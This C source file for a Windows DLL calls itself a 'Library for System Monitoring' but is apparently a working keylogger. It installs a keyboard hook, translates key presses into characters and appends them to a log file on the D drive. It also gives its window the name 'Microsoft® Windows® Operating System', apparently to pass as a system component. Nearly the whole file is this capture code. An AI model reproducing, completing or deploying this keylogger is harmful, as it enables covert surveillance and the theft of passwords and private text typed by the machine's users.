
// Library for System Monitoring
// Written by Arjun Menon

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

/*********************.
| Function Prototypes |
`*********************/

int WINAPI StartSystem(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		WPARAM wParam,LPARAM lParam);
int WINAPI DllMain(HANDLE hModule,
DWORD ul_reason_for_call, LPVOID lpReserved);
__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
HHOOK StartSensing();
LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam);
void DescribeKey(WPARAM wParam, char *keyw);

/******************.
| Global Variables |
`******************/

static char szAppName[] = "Microsoft® Windows® Operating System";
HANDLE hDLL = NULL;

/*********.
| Program |
`*********/

int WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;
	 LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		 WPARAM wParam, LPARAM lParam);

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = szAppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (szAppName, szAppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		DeleteFile("d:\\log.txt");
		StartSensing();
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

int WINAPI DllMain(HANDLE hModule,
				   DWORD ul_reason_for_call,
				   LPVOID lpReserved)
{
	hDLL = hModule;

	return TRUE;
}

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	StartSystem((HINSTANCE)hDLL, NULL, "", SW_NORMAL);
}

HHOOK StartSensing()
{
	return SetWindowsHookEx(WH_KEYBOARD,
	(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,NULL);
}

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	HANDLE hFile; 
	DWORD  nFile; 
	
	hFile = CreateFile("d:\\log.txt", GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return CallNextHookEx(NULL, code, wParam, lParam);
	SetFilePointer(hFile, 0, NULL, FILE_END);

	/* The 32nd bit of lParam tells us if 
	   the key is being pressed or released */
	if(!(lParam >> 31))
	{
		MessageBeep(-1);

		char *keyw = (char *)calloc(30, sizeof(char));
		DescribeKey(wParam, keyw);

		/* The first 16 bits of lParam tells
		   us how long the key was pressed */
		UINT repeat = (lParam << 16) >> 16;
		if(!repeat) repeat = 1;
		char *key = (char *) calloc
		((repeat * strlen(keyw))+1, sizeof(char));
		if(key == NULL)
			goto exit_point;
		while(repeat--)
			strcat(key, keyw);

		if(key)
			WriteFile(hFile, key, strlen(key), &nFile, NULL);
	exit_point:
		free(keyw);
		free(key);
	}
	CloseHandle(hFile);

	return CallNextHookEx(NULL, code, wParam, lParam);
}

void DescribeKey(WPARAM wParam, char *keyw)
{
	char vkc = 0; /* virtual key code */

	vkc = /* maintain alphabet case */
		((GetKeyState(VK_SHIFT) < 0)&&(
		!(GetKeyState(VK_CAPITAL) < 0)))
		? toupper((char)(wParam))
		: tolower((char)(wParam));

	/* numeric pad keys 0 to 10 */
	if((wParam >= 0x60)&&
	   (wParam <= 0x69))
		wParam -= 0x30;

	/* keys from 0 to 9 , A to Z and space */
	if(((wParam >= 0x30) 
	  &&(wParam <= 0x5A)) 
	  ||(wParam == 0x20))
	{
		keyw[0] = vkc;
		keyw[1] = 0;
	}

	else if(wParam == 0x03)
		strcpy(keyw,"[CTRL-BRK]");
	else if(wParam == 0x08)
		strcpy(keyw,"[BACK]");
}